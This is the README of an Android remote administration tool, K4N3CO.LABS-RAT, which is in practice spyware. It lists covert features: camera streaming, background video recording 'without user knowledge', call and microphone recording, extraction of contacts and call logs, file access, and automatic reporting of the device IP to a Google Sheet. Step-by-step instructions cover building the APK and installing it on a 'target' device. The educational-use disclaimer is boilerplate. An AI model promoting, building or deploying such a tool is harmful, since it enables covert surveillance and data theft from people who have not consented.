# 🦅 K4N3CO.LABS-RAT

![K4N3CO Logo](app/src/main/res/drawable/app_logo.png)

Powerful and lightweight Android Remote Administration Tool (RAT) developed by **K4N3CO.LABS**. This tool allows for remote monitoring and management of Android devices through a web-based interface.

## 🚀 Features

-   **Live Camera Streaming**: View real-time camera feed from both front and back cameras directly in your browser.
-   **Background Video Recording**: Record high-quality video in the background without user knowledge.
-   **Photo Capture**: Take instant photos from any available camera.
-   **Audio Management**: 
    -   Live Microphone Recording.
    -   Automatic Call Recording (Incoming/Outgoing).
-   **File Manager**: Browse, download, and manage files on the internal and external storage.
-   **Communication Logs**:
    -   Full Call Log access.
    -   Contact list extraction.
-   **Device Information**: Detailed system, network, hardware, and battery status.
-   **Auto-Reporting**: Automatically sends device IP and connection links to a configured Google Sheet.

## 🛠️ Getting Started

### 1. Requirements
-   **Java 11 or 21** installed on your PC.
-   An Android device (target).
-   A Google Sheet URL for IP reporting.

### 2. Building the APK
1.  Navigate to the `k4n3co-builder/` directory.
2.  Run the builder script:
    -   **Windows**: Double-click `build.bat`
    -   **Linux/Mac**: `bash build.sh`
3.  Follow the prompts to configure:
    -   **App Name**: (Default: K4N3CO.LABS)
    -   **Package Name**: (Default: com.labs.k4n3co)
    -   **Google Sheet URL**: Paste your Apps Script Web App URL.
4.  The final APK will be generated in `k4n3co-builder/output/`.

### 3. Usage
1.  Install the generated APK on the target device.
2.  Open the app and grant all requested permissions.
3.  Click **"Disable Battery Optimization"** to ensure background persistence.
4.  Click **"Start Server"**.
5.  The device IP will appear in your Google Sheet. Open the link to access the control panel.

## ⚠️ Disclaimer
This tool is for **educational and authorized security testing purposes only**. The developers are not responsible for any misuse or damage caused by this application. Use it responsibly.

---
© 2026 K4N3CO.LABS
